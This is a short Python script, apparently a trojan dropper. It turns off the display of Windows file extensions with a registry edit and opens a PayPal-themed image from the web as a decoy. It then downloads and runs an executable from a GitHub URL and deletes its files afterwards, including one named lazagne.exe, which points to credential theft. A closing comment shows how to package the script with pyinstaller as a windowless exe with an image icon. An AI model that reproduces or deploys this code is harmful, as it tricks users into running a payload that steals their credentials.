import requests
import subprocess
import os
import tempfile
import shutil

subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f")

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

paypalSS = "https://howto.org/wp-content/uploads/2019/02/How-to-Get-PayPal-Money-Instantly-4.jpg"

Download(paypalSS)

result = subprocess.Popen("How-to-Get-PayPal-Money-Instantly-4.jpg", shell=True);

Download("https://github.com/JustinAvina/Python-Scripts/blob/main/Executables/Download.exe")

result = subprocess.call("Download.exe", shell=True);
print(result)

os.remove("lazagne.exe")
os.remove("Download.exe")

# pyinstaller --add-data "C:\Users\Justin Avina\Dropbox\PC\Downloads\paypalSS.png;." --noconsole --onefile --upx-dir=\upx --icon png.ico Download.py

# reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f
